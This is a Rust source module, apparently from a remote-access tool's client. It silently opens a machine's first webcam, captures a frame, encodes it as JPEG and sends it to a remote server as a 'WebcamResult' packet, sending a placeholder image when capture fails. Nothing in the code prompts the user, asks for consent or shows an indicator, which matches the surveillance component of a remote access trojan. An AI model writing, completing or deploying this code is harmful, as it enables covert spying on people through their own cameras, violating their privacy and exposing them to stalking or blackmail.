use crate::handler::send_packet;
use common::packets::ServerboundPacket;
use tokio::task;
use std::{panic::{self, AssertUnwindSafe}, thread};
use image::RgbImage;
use std::io::Cursor;
use nokhwa::utils::ApiBackend;

pub async fn take_webcam() {
    task::spawn_blocking(move || {
        let handle = thread::spawn(|| {
            safe_webcam_capture()
        });
     
        match handle.join() {
            Ok(Some(data)) => {
                tokio::spawn(async move {
                    if let Err(e) = send_packet(ServerboundPacket::WebcamResult(data)).await {
                        eprintln!("Failed to send webcam packet: {}", e);
                    }
                });
            }
            _ => {
                let error_image = create_error_image(640, 480, "Camera Capture Failed");
                tokio::spawn(async move {
                    let _ = send_packet(ServerboundPacket::WebcamResult(error_image)).await;
                });
            }
        }
    });
}

fn safe_webcam_capture() -> Option<Vec<u8>> {
    attempt_nokhwa_capture()
}

fn attempt_nokhwa_capture() -> Option<Vec<u8>> {
    use nokhwa::{Camera, utils::{RequestedFormat, RequestedFormatType}};
    use nokhwa::pixel_format::RgbFormat;
 
    let devices = nokhwa::query(ApiBackend::Auto).unwrap_or_default();
    if devices.is_empty() {
        eprintln!("No webcam devices found");
        return None;
    }

    let camera_index = devices[0].index().clone();
    let requested_format = RequestedFormat::new::<RgbFormat>(RequestedFormatType::None);
 
    let camera_result = panic::catch_unwind(AssertUnwindSafe(|| {
        Camera::new(camera_index, requested_format)
    }));
 
    let mut camera = match camera_result {
        Ok(Ok(cam)) => cam,
        Ok(Err(e)) => {
            eprintln!("Failed to initialize camera: {}", e);
            return None;
        }
        _ => {
            eprintln!("Camera initialization failed or panicked");
            return None;
        }
    };
 
    if let Err(e) = camera.open_stream() {
        eprintln!("Failed to open camera stream: {}", e);
        return None;
    }
 
    for _ in 0..5 {
        let _ = camera.frame();
        thread::sleep(std::time::Duration::from_millis(100));
    }

    let frame = match camera.frame() {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to capture frame: {}", e);
            let _ = camera.stop_stream();
            return None;
        }
    };
 
    let _ = camera.stop_stream();

    let img = match frame.decode_image::<RgbFormat>() {
        Ok(i) => i,
        Err(e) => {
            eprintln!("Failed to decode frame to RGB: {}", e);
            return None;
        }
    };

    let mut jpeg_bytes = Cursor::new(Vec::with_capacity(1024 * 100));
    let mut encoder = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut jpeg_bytes, 80);
    if encoder.encode_image(&img).is_err() {
        return None;
    }

    Some(jpeg_bytes.into_inner())
}

fn create_error_image(width: u32, height: u32, _message: &str) -> Vec<u8> {
    let img = RgbImage::from_fn(width, height, |_, _| {
        image::Rgb([50, 0, 0])
    });

    let mut jpeg_bytes = Cursor::new(Vec::with_capacity(64 * 1024));
    let mut encoder = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut jpeg_bytes, 80);
    let _ = encoder.encode_image(&img);
    jpeg_bytes.into_inner()
}